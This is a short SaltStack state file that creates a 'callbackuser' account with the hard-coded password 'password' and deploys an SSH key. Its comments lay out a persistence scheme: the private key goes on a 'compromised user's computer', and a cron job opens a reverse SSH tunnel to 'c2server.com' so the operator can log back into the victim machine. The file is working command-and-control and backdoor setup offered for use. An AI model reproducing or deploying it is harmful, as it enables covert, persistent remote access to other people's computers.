Call back user:
  user.present:
    - name: callbackuser
    - password: password
    - password_hash: yes
    - shell: /bin/false

Set keys:
  file.managed:
    - name: /home/callbackuser/.ssh/authorized_keys
    - source: salt://callback-server-ssh/id_rsa.pub

# make sure to put the private key (id_rsa) on the compromised user's computer for their ssh client to use
# then just make a cron job to call back: ssh -R 5050:localhost:22 -N c2server.com -l callbackuser
# then from the box with the currently applied state, you can ssh in the local port which will prompt you for the 
# compromised user's ssh creds: ssh -p 5050 callbackuser@localhost

